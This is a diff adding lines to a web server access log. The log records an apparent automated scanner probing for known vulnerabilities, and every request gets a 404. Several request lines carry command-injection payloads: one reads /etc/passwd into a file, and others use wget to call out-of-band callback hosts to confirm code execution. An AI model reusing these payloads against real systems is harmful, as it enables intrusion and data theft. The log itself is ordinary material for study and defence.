@@ -410,3 +410,10 @@ INFO:     52.195.177.128:37350 - "GET /objects/regww.txt HTTP/1.1" 404 Not Found
 INFO:     52.195.177.128:25078 - "GET /card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20DbarhbDQTc.txt%60 HTTP/1.1" 404 Not Found
 INFO:     52.195.177.128:64108 - "GET /DbarhbDQTc.txt HTTP/1.1" 404 Not Found
 INFO:     99.8.68.128:58311 - "GET /auth/session HTTP/1.1" 401 Unauthorized
+INFO:     52.195.177.128:16260 - "GET /Collector/nms/addModifyZTDProxy?ztd_server=127.0.0.1&ztd_port=3333&ztd_username=user&ztd_password=$(/bin/wget$IFShttp://d0eg8v540n5cgkjrqit0gi98wk98wqkhw.oast.site) HTTP/1.1" 404 Not Found
+INFO:     52.195.177.128:16270 - "GET /Collector/storagemgmt/apply?data%5B0%5D%5Bhost%5D=%60/bin/wget+http://d0eg8v540n5cgkjrqit0r57tbn85sac7q.oast.site%60&data%5B0%5D%5Bpath%5D=mypath&data%5B0%5D%5Btype%5D=mytype HTTP/1.1" 404 Not Found
+INFO:     52.195.177.128:41658 - "GET / HTTP/1.1" 404 Not Found
+INFO:     52.195.177.128:24408 - "POST /cgi-bin/supportInstaller HTTP/1.1" 404 Not Found
+INFO:     52.195.177.128:37462 - "POST /api/timelion/run HTTP/1.1" 404 Not Found
+INFO:     52.195.177.128:63418 - "GET /wp-content/plugins/jsmol2wp/readme.txt HTTP/1.1" 404 Not Found
+INFO:     52.195.177.128:31600 - "GET /index.php/login HTTP/1.1" 404 Not Found
